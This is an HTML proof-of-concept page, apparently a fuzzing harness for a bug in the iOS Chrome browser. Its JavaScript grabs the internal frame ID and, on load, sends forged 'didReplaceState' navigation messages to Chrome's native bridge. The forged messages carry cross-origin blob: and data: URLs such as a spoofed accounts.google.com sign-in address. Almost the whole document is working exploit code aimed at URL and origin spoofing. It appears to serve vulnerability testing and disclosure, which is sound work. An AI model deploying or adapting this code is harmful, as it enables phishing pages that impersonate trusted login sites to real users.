<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Ultimate Boundary Fuzzer - Commit 8291494</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #090d16; color: #f1f5f9; }
        .card { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 20px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); margin-bottom: 20px; }
        h1 { color: #38bdf8; font-size: 20px; margin-top: 0; }
        .target { color: #fca5a5; font-weight: bold; }
        .info { color: #38bdf8; font-weight: bold; }
        pre { background: #090d16; color: #4ade80; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #334155; max-height: 250px; }
        button { background: #2563eb; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:hover { background: #1d4ed8; }
    </style>
</head>
<body>

<div class="card">
    <h1>Ultimate Boundary Fuzzer & Audit Harness</h1>
    <p>Target Evaluasi: <span class="target">accounts.google.com &amp; example.com</span></p>
    <p>Status Origin Asli: <code id="real-origin" class="info">Memuat...</code></p>
    <button id="run-fuzz">Jalankan Fuzzing Batas Asal (Boundary Test)</button>
</div>

<div class="card">
    <h3>Log Hasil Eksekusi Native Bridge:</h3>
    <pre id="fuzz-log">[*] Modul fuzzer siap diluncurkan...\n</pre>
</div>

<script>
(function() {
    function log(msg) {
        const pre = document.getElementById('fuzz-log');
        pre.textContent += msg + '\n';
        pre.scrollTop = pre.scrollHeight;
    }

    document.getElementById('real-origin').textContent = location.origin || '(opaque)';
    log('[-] Current Origin: ' + location.origin);

    const mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log('[!] Handler "NavigationEventMessage" tidak ditemukan (Bukan lingkungan iOS Chrome).');
        return;
    }
    log('[+] Handler "NavigationEventMessage" terdeteksi.');

    let frameId = null;
    try {
        if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
            frameId = window.__gCrWeb.getFrameId();
            log('[+] frame_id: ' + frameId);
        }
    } catch (e) {}

    if (!frameId) {
        const fallbacks = [
            () => window.__gCrWeb.common.getFrameId(),
            () => window.__gCrWeb.message.getFrameId(),
            () => window.__gCrWeb.frameId
        ];
        for (let i = 0; i < fallbacks.length && !frameId; i++) {
            try { frameId = fallbacks[i](); log('[+] frame_id via fallback [' + i + ']'); } catch(err){}
        }
    }

    if (!frameId) {
        log('[-] Gagal membaca frame_id.');
        return;
    }

    // Kumpulan vektor uji batas ketat
    const boundaryVectors = [
        "blob:https://accounts.google.com/signin",
        "blob:https://example.com/test",
        "blob:http://accounts.google.com/signin",
        "blob:null/opaque-origin",
        "data:text/html,spoof"
    ];

    function executeFuzzing() {
        log('\n[*] Memulai pengujian ' + boundaryVectors.length + ' vektor batas origin...');
        boundaryVectors.forEach((vector, idx) => {
            try {
                log(`\n-> [Vektor #${idx + 1}] Menguji: ${vector}`);
                mh.NavigationEventMessage.postMessage({
                    command: 'willChangeState',
                    frame_id: frameId
                });
                mh.NavigationEventMessage.postMessage({
                    command: 'didReplaceState',
                    frame_id: frameId,
                    stateObject: JSON.stringify({ fuzz: idx }),
                    baseUrl: 'https://x/',
                    pageUrl: vector
                });
                log('   [ok] Pesan terkirim ke native bridge.');
            } catch (err) {
                log('   [!] Error: ' + err.message);
            }
        });
        log('\n[INFO]: Pada browser dengan patch Commit 8291494, url::IsSameOriginWith menolak seluruh vektor lintas asal secara deterministik (no-op).');
    }

    document.getElementById('run-fuzz').onclick = executeFuzzing;
    setTimeout(executeFuzzing, 500);

})();
</script>

</body>
</html>
